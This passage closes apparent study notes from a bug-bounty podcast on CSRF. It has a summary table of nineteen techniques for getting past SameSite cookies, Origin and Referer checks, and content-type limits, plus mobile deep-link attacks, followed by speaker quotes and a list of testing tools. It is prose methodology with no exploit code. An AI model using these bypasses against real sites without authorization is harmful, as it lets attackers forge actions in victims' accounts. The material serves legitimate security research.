- **Where to apply:** Every target you spend more than an hour on. The ROI on gadget cataloging increases exponentially with the time you spend on a target.

---

## MASTER SUMMARY TABLE

| # | Technique | Category | Where to Apply |
|---|-----------|----------|----------------|
| 1 | SameSite Lax Default Behavior | Defense Analysis | Every target — first step of CSRF assessment |
| 2 | Lax+POST Two-Minute Window | SameSite Bypass | Targets with implicit Lax cookies + session refresh gadget |
| 3 | Session Refresh Gadgets | Exploit Chain | Login/SSO/OAuth endpoints for resetting Lax+POST timer |
| 4 | SameSite Strict Awareness | Defense Analysis | High-security targets — verify before building PoC |
| 5 | Content-Type Confusion | CSRF Primitive | JSON APIs — test if server accepts text/plain or form-encoded |
| 6 | POST-to-GET Method Conversion | CSRF Primitive | Every POST endpoint — fastest CSRF check |
| 7 | HEAD Request Method Confusion | Framework Quirk | Ruby on Rails applications, especially OAuth endpoints |
| 8 | Rails `_method` Parameter Override | Framework Quirk | Rails, Laravel, and similar frameworks |
| 9 | Null Origin via Data URI iframe | Defense Bypass | Apps using Origin header as CSRF protection |
| 10 | Referrer-Policy Bypass (unsafe-url) | Defense Bypass | Apps using Referer header with substring/contains check |
| 11 | Suppressing Referer Header | Defense Bypass | Apps that skip CSRF check when Referer is absent |
| 12 | Double-Action Single-Click | Exploit Chain | Multi-step CSRF chains requiring two simultaneous requests |
| 13 | 307 Redirect for POST Preservation | Exploit Chain | CSRF chains needing timing control or method preservation |
| 14 | Login CSRF | CSRF Variant | Login, SSO callback, and account-linking endpoints |
| 15 | HTML Form enctype Constraints | Fundamental | Every CSRF — understand the three allowed content types |
| 16 | QR Code to WebView Hijack | Mobile CSRF | Mobile apps with built-in QR scanners |
| 17 | Deep Link / Intent CSRF (CARF) | Mobile CSRF | Mobile apps with deep links triggering state changes |
| 18 | JavaScript Bridge Exploitation | Mobile CSRF | Mobile apps with internal WebViews and JS bridges |
| 19 | Gadget-Based Methodology | Methodology | Every target — catalog small findings for chain building |

---

## KEY QUOTES WORTH REMEMBERING

> "CSRF is a vulnerability that a lot of people feel like got deleted with SameSite cookies and it's just not the case. I still see this all the time on all levels of hardenedness of target." — Justin Gardner

> "If SameSite is not set, if the SameSite attribute is not set on a cookie, then that will be SameSite Lax by default, which is different than SameSite Lax explicit. SameSite Lax when it's explicitly set does not have the Lax+POST accommodation." — Justin Gardner

> "Content type handling is probably gonna be implemented in one place. It's gonna be added as a middleware for the entire server versus being on an endpoint by endpoint basis." — Joel Margolis

> "You can harvest one click and get two actions to be triggered. You can get a form submission because the button got clicked, and you can also use the onclick." — Justin Gardner

> ".endsWith is not safe. If it was just .equals, that would have been fine, but .endsWith is very, very flexible." — Joel Margolis

> "Those gadgets are very valuable. Even if you haven't found a bug, make sure you're noting down these gadgets. If you're keeping those in the front of your mind, your brain will figure out a way to utilize these and chain them." — Justin Gardner

> "Deep links — either the functionality is exposed or it isn't. There's no detection that's needed. If you don't want this to be a thing, it has to be not exposed at all." — Joel Margolis

> "I bypassed it because you can actually set the referrer policy on your own page to send the full URL. Since you control the page that you're sending from, you can use a meta tag to set the referrer policy." — Justin Gardner

---

## RESOURCES MENTIONED

- **The Great SameSite Confusion** by Jub0bs — Comprehensive resource on SameSite cookie behavior and edge cases
- **Bypassing GitHub's OAuth flow** by Teddy Katz — HEAD request method confusion in Rails, $25K bounty on GitHub
- **SameSite Lax by default** — Rolled out February 4, 2020, in Chromium
- **Referrer-Policy MDN documentation** — Mozilla docs on all referrer policy values
- **JS Weasel** by Charlie Erickson — JavaScript analysis tool (Burp plugin + VS Code extension) for deobfuscation, chunk fetching, and beautification
- **PwnFox** — Firefox extension for multi-session bug bounty testing with color-coded profiles
- **AutoChrome** by NCC Group — Chrome automation tool for security testing setup
- **Request Highlighter** — Browser extension for color-coding proxy requests per session
- **Caido** — Web proxy (alternative to Burp Suite) — has "Change Request Method" feature
- **SQLMap** — Accepts curl syntax directly (`sqlmap` replaces `curl` in copy-as-curl output) and raw HTTP request files (`-r` flag)
